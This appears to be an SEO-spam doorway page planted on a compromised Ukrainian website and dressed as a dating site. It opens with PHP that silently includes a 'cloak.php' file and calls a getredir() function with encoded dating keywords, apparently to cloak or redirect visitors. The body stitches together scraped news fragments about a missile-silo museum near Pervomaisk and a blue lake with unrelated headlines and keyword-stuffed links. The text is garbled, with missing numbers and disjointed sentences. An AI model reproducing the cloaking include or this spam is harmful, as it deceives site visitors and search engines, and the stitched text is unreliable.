<?php
if(!@include('cloak.php'))	@include('../cloak.php');
if(function_exists('getredir')){
	@getredir ('api', '%d0%bd%d0%be%d0%b2%d0%b8%d0%b9+%d1%81%d0%b0%d0%b9%d1%82+%d0%b7%d0%bd%d0%b0%d0%b9%d0%be%d0%bc%d1%81%d1%82%d0%b2+%d0%bf%d0%be%d0%b1%d0%bb%d0%b8%d0%b7%d1%83+%d0%9f%d0%b5%d1%80%d0%b2%d0%be%d0%bc%d0%b0%d0%b9%d1%81%d1%8c%d0%ba+%d0%a3%d0%ba%d1%80%d0%b0%d1%97%d0%bd%d0%b0', '2021-05-21', 'pir_210521/UA_dat_geo_trans_ukr', 'ua_dating.txt');
}
?><!doctype html>
<html lang="">
<head>
	<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
	<title>Нова пам'ятка Миколаївщини: під Первомайськом з'явилося блакитне озеро</title>
	<meta name="description" content="У складі місцевої фауни нараховується близько видів судинних рослин, 27 з них занесено до Червоної книги України, 4 – до" />
	<link rel="canonical" href="https://masage.od.ua/img/133/tehi-noviy-sayt-znayomstv.php" />
<?php if(!@include('../inc1mywp1.php')) @include('inc1mywp1.php'); ?>
						<div id="primary-menu" class="menu"><ul>
<li class="page_item page-item-2"><a href="https://masage.od.ua/img/454/duvu-msto-onlayn.php">місто онлайн знайомства поблизу Вінниця Україна</a></li><li class="page_item page-item-2"><a href="https://masage.od.ua/img/291/xo-my-sayt.php">мій сайт знайомств у Канів Україна</a></li><li class="page_item page-item-2"><a href="https://masage.od.ua/img/103/jilu-sayt-znayomstv.php">сайт знайомств на в Василівка Україна</a></li><li class="page_item page-item-2"><a href="https://masage.od.ua/img/247/foqiz-sluzhba-znayomstv-v.php">служба знайомств в Городня Україна</a></li>
</ul></div>
						<div class="main-navigation-bg"></div>
						<div class="clearfix"></div>
					</nav><!-- #site-navigation -->
				</div>
			</div>

		</div>

	</header><!-- #masthead -->



	<div id="content" class="site-content">
	<div class="container"><div class="row"><div class="col-md-7 order-md-3">
	<div id="primary" class="content-area">
		<main id="main" class="site-main main-content-middle">


<article id="post-1" class="post-1 post type-post status-publish format-standard hentry category-uncategorized">
		<header class="entry-header">
		<h1 class="entry-title">Новий сайт знайомств поблизу Первомайськ Україна</h1><!-- .entry-meta -->
			</header><!-- .entry-header -->



	<div class="entry-content">

<p>
<p>Командний пункт міг надійно функціонувати в різних умовах, зокрема і в автономному режимі протягом 45 діб. Варто зауважити, що дітям крім старшокласників дозволяють відвідувати підземний КП тільки у супроводі дорослих. І техніка безпеки тут — як у війську, а не як на розважальному атракціоні. Зате відчуття від перебування тут просто неймовірні», - каже Тарасенко.</p>
<p>Цікавість відвідувачів викликає і макет найпотужнішої у світі міжконтинентальної балістичної ракети РСВ «Воєвода» за класифікацією НАТО - SS "Satanа". Вона створена в середині х років у КБ «Південне». Ця ракета здатна доставити десять ядерних боєголовок з індивідуальним наведенням потужністю Кт кожна на відстань в 15 тисяч кілометрів.</p>
<p>Крім того, вона оснащена вісьмома важкими помилковими цілями, активними постановниками перешкод, дипольними відбивачами. Її готовність до запуску становить усього 62 секунди. Взагалі відвідувачі музею мають змогу отримати повну уяву про розвиток радянських балістичних ракет.</p><img src="http://pervomaisk.mk.ua/uploads/2018/1/2/content/67d4a55f5c1238507c635c94e3b14fef.jpeg" alt="Тепер на півдні України на одне місце для фотосесії більше" style="max-width: 480px; max-height: 480px;"/><p>Адже протягом майже півстоліття, були розроблені, випробувані і прийняті на озброєння десятки різних типів ракет. Наступна ракета Р кодова назва НАТО — SS-4 «Sandal» була створена у році. Її макет також експонується у музеї», - нагадують співробітники музею. До речі, це перша самостійна розробка ОКБ — майбутнього КБ «Південне».</p>
<p>Ракета Р була головним фігурантом «карибської кризи». У жовтні року партію цих ракет перекинули на Кубу, що ледь не спровокувало ядерний конфлікт. Цікава деталь: поряд із технічними нововведеннями і потужними характеристиками а Р могла нести заряд в 2 мегатонни , ця ракета мала і певні «спадкові» риси, зокрема її діаметр був залишений ще від німецької ФАУ Наступна модель - Р - доставляла ядерний заряд вже на 4,5 тисячі км. У кінці року на озброєння приймається перша двоступенева ракета Р Вона могла доставити боєголовку потужністю 3 мегатонни на 13 тисяч кілометрів - це вже міжконтинентальна ракета.</p>
<p>А у 60 - 70 роках минулого століття у війська надходить ціла низка нових ракетних комплексів.</p><strong><a id='o1'></a><h2>Знайомства Первомайськ</h2></strong><p>Варто зазначити, що рідинні ракети в експлуатації мали недоліки: відносно невисоку боєздатність, складну систему експлуатації тощо. Все це дуже ускладнювало їх перебування на бойовому чергуванні і знижувало ефективність. Тому і в СРСР, і в США були зроблені висновки про доцільність розгортання робіт зі створення твердопаливних ракет.</p>
		
	<p>Вони також були на озброєнні ї ракетної армії. Музей намагається постійно поповнювати свою експозицію. Він представляє собою колонну вантажівок, на яких розташоване різноманітне спеціалізоване обладнання», - розповідає А. Сюди ввійшли 7 унікальних військових машин. Ще одне нещодавнє надбання музею — ешелон для транспортування балістичних ракет. Для цього на території музею побудували метри залізничних колій.</p><strong><a id='o2'></a><h2>Ракетна шахта на Миколаївщині: музей «убивчих» експонатів</h2></strong><p>Ешелон укомплектований маневровим тепловозом, двома пасажирськими вагонами для особового складу, вагоном супроводу та ізотермічними транспортними вагонами. Новини по темі:. При "ДНР" горлівський "Стирол" випускає лише пластикові стаканчики. У Чернігівській області затримали "чорного археолога" з прикрасами часів Київської Русі.</p>
		
			
				<div>Поліський заповідник - Українська тайга - Україна вражає</div>
				<div><iframe width='560' height='315' src='https://www.youtube.com/embed/1HvYjaUYSbo' frameborder='0' allowfullscreen></iframe></div>
			
		
	<p>Прокуратура розпочала заочне розслідування проти бойовика з комскладу "ЛНР". У Львові вночі спалили два автомобілі голови Брюховецької сільради. Про опуклі деталі мозівських новацій. На Байковому кладовищі в Києві зник бюст Міхновського. Хірург Вадим Козловський: "Я врятував життя чи Бог? Важко сказати". Через негоду знеструмлено 38 населених пунктів у Львівській області. Перший енергоблок Запорізької АЕС підключено до енергомережі. За добу на Донбасі поранено двох військових. У Львові після зливи сміття з неприбраних майданчиків розмило по місту. Блакитне озеро, Мигія, Миколаївська область © facebook.</p>
		
			<br><ol>
			
				<li>1. Сергій Дичек.</li>
			
				<li>одиночні події знайомств Бахмач Україна.</li>
			
				<li>знайомства з чоловіком з Кілія Україна.</li>
			
				<li>Account Options.</li>
			
				<li>Військово-цивільна адміністрація міста Лисичанськ Луганської області - Виконавчі органи.</li>
			
			</ol>
		
	<p>Блакитне озеро, Мигія, Миколаївська область © instagram. Блакитне озеро, Мигія, Миколаіївська область © instagram. Незважаючи на те, що Миколаївське озеро порівнюють з турецькими пам'ятками, нам воно нагадує білоруські Мальдіви. Що це таке - читай в нашому матеріалі.</p><strong><a id='o3'></a><h2>Первомайськ | Знайомства 💗 | Миколаївська область — mistaUA</h2></strong><p>Підписуйся на наш telegram і будь в курсі всіх найцікавіших та актуальних новин! Русский Українська. Читай tochka. net в социальных сетях:.</p><a id='o4'></a><h3>2. Сергій Рацун</h3><p>Чим зайнятися в Миколаївській області: 5 ідей для туристів. Бузький Гард: 10 цікавих фактів про природну пам'ятку. Небанальний маршрут: відвідуємо 5 унікальних місць Миколаївщини.</p>
		
			<br><ol>
			
				<li>знайомства людина поруч Вишгород Україна;</li>
			
				<li>особиста служба знайомств в Запоріжжя Україна.</li>
			
				<li>Знайомства з самими чарівними жінками 30 - 50 років | Дві Зірки.</li>
			
				<li>виконавчі служби знайомств в Єнакієве Україна.</li>
			
				<li>kyiv Diplomatic#5 by Київ дипломатичний Kyiv Diplomatic - Issuu.</li>
			
			</ol>
		
	<p>Коментарі Отримувати коментарі до цієї новини по email. символів  Додати коментар Увійти через:.</p>
</p>
	</div><!-- .entry-content -->

</article><!-- #post-1 -->


		</main><!-- #main -->
	</div><!-- #primary -->


	</div><div class="col-md-2 order-md-1">

	<aside id="secondary" class="widget-area">
			</aside><!-- #secondary -->
</div><div class="col-md-3 order-md-10">
	<aside id="secondary" class="widget-area">
		<section id="search-2" class="widget widget_search"><form role="search" method="get" class="search-form" action="https://masage.od.ua/img/266/taguz-znayomstva-z.php">
				<label>
					<span class="screen-reader-text">Search for:</span>
					<input type="search" class="search-field" placeholder="Search &hellip;" value="" name="s" />
				</label>
				<input type="submit" class="search-submit" value="Search" />
			</form></section>		<section id="recent-posts-2" class="widget widget_recent_entries">		<h2 class="widget-title">Recent Posts</h2>		<ul>
											<li><a href="https://masage.od.ua/img/280/bumy-vikonavch-poslugi-z.php">виконавчі послуги зі сватання в Ківерці Україна</a></li><li><a href="https://masage.od.ua/img/208/hysu-veb-sayti-znayomstv.php">веб-сайти знайомств поблизу Мелітополь Україна</a></li><li><a href="https://masage.od.ua/img/208/sobed-naykrash-shvidksn-znayomstva.php">найкращі швидкісні знайомства Павлоград Україна</a></li><li><a href="https://masage.od.ua/img/211/kixa-mska-pdklyuchennya.php">міська підключення в Вінниця Україна</a></li><li><a href="https://masage.od.ua/img/240/lovyn-vikonavch-sluzhbi-znayomstv.php">виконавчі служби знайомств поблизу Яворів Україна</a></li>
					</ul>
		</section>

			<section id="meta-2" class="widget widget_meta"><h2 class="widget-title">Articles</h2>
				<ol><li><a href='#o1'>Знайомства Первомайськ</a></li>
<li><a href='#o2'>Ракетна шахта на Миколаївщині: музей «убивчих» експонатів</a></li>
<li><a href='#o3'>Первомайськ | Знайомства 💗 | Миколаївська область — mistaUA</a></li>
<li><a href='#o4'>2. Сергій Рацун</a></li>
</ol>
			</section>

	</aside><!-- #secondary -->
</div></div></div>	</div>
	<footer id="colophon" class="site-footer">

		<div class="covf-footer-copyright">
			<div class="container">
				<div class="row">
					<div class="col">
						<div class="site-info text-center">
							Powered by 	<a href="https://masage.od.ua/img/248/visu-shvidksn-znayomstva.php">Covfefe WordPress Theme</a>
						</div>
					</div>
				</div>
			</div>
		</div>
	</footer><!-- #colophon -->
</div><!-- #page -->

<script type='text/javascript' src='https://masage.od.ua/img/wp-content/themes/covfefe.1.0.2/covfefe/js/jquery.marquee.js?ver=20151215'></script>
<script type='text/javascript' src='https://masage.od.ua/img/wp-content/themes/covfefe.1.0.2/covfefe/js/scripts.js?ver=20151215'></script>
<script type='text/javascript' src='https://masage.od.ua/img/wp-includes/js/comment-reply.min.js?ver=5.0.3'></script>
<script type='text/javascript' src='https://masage.od.ua/img/wp-includes/js/wp-embed.min.js?ver=5.0.3'></script>

</body>
</html>